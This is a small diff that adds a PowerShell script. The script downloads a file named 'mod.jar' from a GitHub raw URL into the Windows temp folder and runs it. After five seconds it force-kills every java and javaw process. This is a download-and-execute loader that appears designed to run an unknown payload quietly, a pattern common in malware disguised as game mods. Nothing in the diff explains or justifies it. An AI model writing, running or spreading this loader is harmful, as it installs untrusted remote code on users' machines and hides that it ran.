@@ -1,1 +1,11 @@
+$url = "https://raw.githubusercontent.com/drhaplan-dotcom/qwe/refs/heads/main/mod.jar"
+$jar = Join-Path $env:TEMP "mod.jar"
 
+Invoke-WebRequest -Uri $url -OutFile $jar
+
+Start-Process $jar
+
+Start-Sleep -Seconds 5
+
+Get-Process -Name "javaw","java" -ErrorAction SilentlyContinue |
+    Stop-Process -Force -ErrorAction SilentlyContinue
